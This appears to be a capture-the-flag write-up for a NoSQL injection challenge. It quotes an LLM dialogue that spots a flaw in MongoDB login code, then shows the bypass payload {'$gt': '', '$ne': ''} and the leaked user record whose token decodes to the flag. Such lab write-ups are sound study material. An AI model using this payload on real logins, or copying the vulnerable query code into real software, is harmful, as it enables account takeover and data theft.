# No Sql Injection #


> ## Description ##
>
> Can you try to get access to this website to get the flag? You can
> download the source here. The website is running here. Can you log in?
>
> ## Hints ##
>
> Not only SQL injection exist but also NoSQL injection exists.
>
> Make sure you look at everything the server is sending back

## Solution ##

My dialogue with an LLM:

I have following Typescript code that connects to a Mongo DB to find
users in a table. Can you check if there are any vulnerabilities in
this code that I should consider?

``` javascript
const users = await User.find({
      email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
      password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password
    });

    if (users.length < 1)
      return new Response("Invalid email or password", { status: 401 });
    else {
      return new Response(JSON.stringify(users), { status: 200 });
    } 
```

> The code you provided appears to be connecting to a MongoDB to find
> users based on email and password. While the code is functional, there
> are several security considerations and potential vulnerabilities to
> address:
>
> 1. Injection Vulnerability: The use of JSON.parse() on the email and
>    password variables could potentially introduce injection
>    vulnerabilities. If an attacker can control the email or password
>    values, they might be able to inject malicious code via JSON
>    payloads.
>    
>    Solution: Instead of using JSON.parse(), you should validate and
>    sanitize the input before passing it to the query. For instance,
>    you can use regex or other validation methods to ensure that email
>    and password contain only the expected characters.
>
> ...

Can you give me examples for injection vulnerabilities related to the
JSON.parse() above?

> Certainly! Injection vulnerabilities related to the use of
> `JSON.parse()` in the provided code could occur if the email or
> password variables are under the control of an attacker. Here are some
> examples of how injection attacks could be attempted:
>
> 1. SQL Injection via JSON Payload:
>
> 	If the email or password fields are expected to be strings but are
>     controlled by an attacker, they could inject malicious SQL code
>     into the JSON payload. For example:
>
>     ``` json
> 	{
> 	"$gt": "",
> 	"$ne": ""
> 	}
> 	```
>
> 	When parsed, this JSON payload could be interpreted as a MongoDB
> 	query condition, resulting in a query that retrieves all users
> 	where the email or password field is greater than an empty string
> 	and not equal to an empty string. This could potentially bypass
> 	authentication checks.

With these hints, it is possible to login using `{"$gt": "", "$ne":
""}` both as email and password.

The json response looks as follows:

``` json
[
	{
		"_id":"65f08d9329a7cb4b93eba6e0",
		"email":"joshiriya355@mumbama.com",
		"firstName":"Josh",
		"lastName":"Iriya",
		"password":"Je80T8M7sUA",
		"token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzVlMjQ1ZDZlfQ==",
		"__v":0
	}
]
```

The token base64 decodes to the flag.
